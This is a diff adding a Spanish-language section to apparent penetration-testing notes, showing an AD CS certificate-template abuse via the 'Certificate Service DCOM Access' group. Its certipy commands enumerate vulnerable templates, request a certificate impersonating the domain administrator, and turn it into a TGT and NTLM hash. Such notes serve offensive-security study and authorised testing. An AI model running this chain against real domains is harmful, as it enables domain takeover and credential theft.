@@ -239,3 +239,29 @@ Notas:
 	1. Crear el recuros compartido antes de ejecutar la herramineta 'reg.py'
 	2. La ejecución de la herramienta 'reg.py' y el comando de 'impacket-smbserver' deben de ser en el mismo directorio en Kali para evitar un error 
 ```
+
+```powershell 
+6. 'Certificate Service DCOM Access' = 
+
+
+Pasos:
+❯ certipy find -ns IP -u 'user' -p 'password' -dc-ip IP -target IP     # Enumerar el 'AD CS' para ver si hay vulnerabilidades y las IP son del DC
+	❯ cat file_certipy.txt | grep Vuln -C 50       # Mirar las 50 lineas donde existe la vulenrabilidad 
+
+❯ certipy req -username user@domain.corp -password passwd -target-ip IP -ca CA -template 'template_name' -upn 'administrator@domain.corp'        # Solicitar el certificado del usuario 'Administrator'
+	# ca = Es el certificado de autoridades, se encuentra en el archivo enumerado anteriormente 
+	# template = Es la plantilla vulnerable y se encuentra en el archivo enumerado anteriormente
+	# upn = El usuario al que queremos suplantar 
+	# user = Es el usuario que se encuentra en el grupo 'Certificate Service DCOM Access' 
+	
+❯ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'domain.corp' -dc-ip IP  # Solicitar el TGT  del usuario 'administrator' con el certificado 'PFX' y se obtiene el hash NTLM  
+
+❯ 
+
+
+Notas:
+	1. Sincronizar Kali con el DC 
+		❯ ntpdate IP_DC
+	2. Al solicitar el certificado se debe de mostrar lo siguiente: 'Saved certificate and private key to administrator.pfx'
+	3. 
+```
